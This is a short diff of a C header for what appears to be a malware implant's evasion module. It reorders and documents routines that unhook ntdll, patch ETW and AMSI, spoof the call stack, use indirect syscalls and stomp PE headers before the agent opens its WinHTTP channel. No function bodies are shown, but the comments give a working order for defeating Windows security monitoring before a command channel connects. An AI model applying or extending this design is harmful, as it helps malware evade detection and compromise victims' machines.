@@ -156,20 +156,21 @@ BOOL evasion_stomp_pe_headers(void);
  * ═══════════════════════════════════════════════════════════════════ */
 
 /*
- * Split evasion init — use these in agent_init() around channel_init_active():
+ * evasion_init() — run ALL evasion patches, then return.
  *
- *   evasion_init_pre_connect()   — anti-analysis + unhook ntdll + ETW + AMSI + stack spoof
- *   channel_init_active()        — WinHttpOpen
- *   evasion_init_post_connect()  — indirect syscalls + PE stomp
+ * Call BEFORE channel_init_active() (i.e. before WinHttpOpen).
+ * WinHTTP caches pointers into the caller's PE headers during
+ * WinHttpOpen; if PE stomp runs after that call, the cached
+ * pointers dangle and WinHttpSendRequest deadlocks.
  *
- * WinHTTP registers ETW providers during WinHttpOpen. Patching ETW
- * AFTER that call leaves dangling provider state → WinHttpSendRequest
- * deadlocks. Unhook/ETW/AMSI MUST run BEFORE WinHttpOpen.
+ * Internal order:
+ *   anti-analysis → unhook ntdll → patch ETW → patch AMSI →
+ *   stack spoof → indirect syscalls → PE stomp (last)
  */
+BOOL evasion_init(void);
+
+/* Split helpers (used internally by evasion_init; exported for tests). */
 BOOL evasion_init_pre_connect(void);
 BOOL evasion_init_post_connect(void);
-
-/* Legacy single-call wrapper (calls both phases back-to-back). */
-BOOL evasion_init(void);
 
 #endif /* EVASION_H */
